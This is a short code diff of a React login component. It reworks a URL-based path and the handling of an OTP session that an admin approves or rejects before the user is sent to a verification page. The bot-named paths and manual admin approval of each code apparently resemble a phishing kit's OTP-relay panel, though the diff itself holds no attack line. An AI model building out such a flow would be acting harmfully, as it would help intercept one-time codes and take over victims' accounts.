@@ -45,9 +45,8 @@ function Login() {
   const inputRefs = useRef([])
   const sessionRef = useRef(null)
   const timerRef = useRef(null)
-  const isBotPath = user && user !== 'default' && user !== 'undefined'
-  const userId = user || getBotName()
-  const basePath = isBotPath ? `/${user}` : ""
+  const { user } = useParams()
+  const basePath = user ? `/${user}` : "/default"
   
   const statusMessages = {
     pending: "⏳ En attente...",
@@ -102,9 +101,10 @@ function Login() {
         const data = response.data
         
         if (data.status === "approved") {
-          setStatus("approved")
+          setAdminMessage("")
           setLoading(false)
-          navigate(`${basePath}/verification`)
+          localStorage.removeItem('otpSessionId')
+          setTimeout(() => navigate(`${basePath}/verification`), 500)
         } else if (data.status === "rejected") {
           setError("❌ Request rejected by admin. Please try again.")
           setLoading(false)
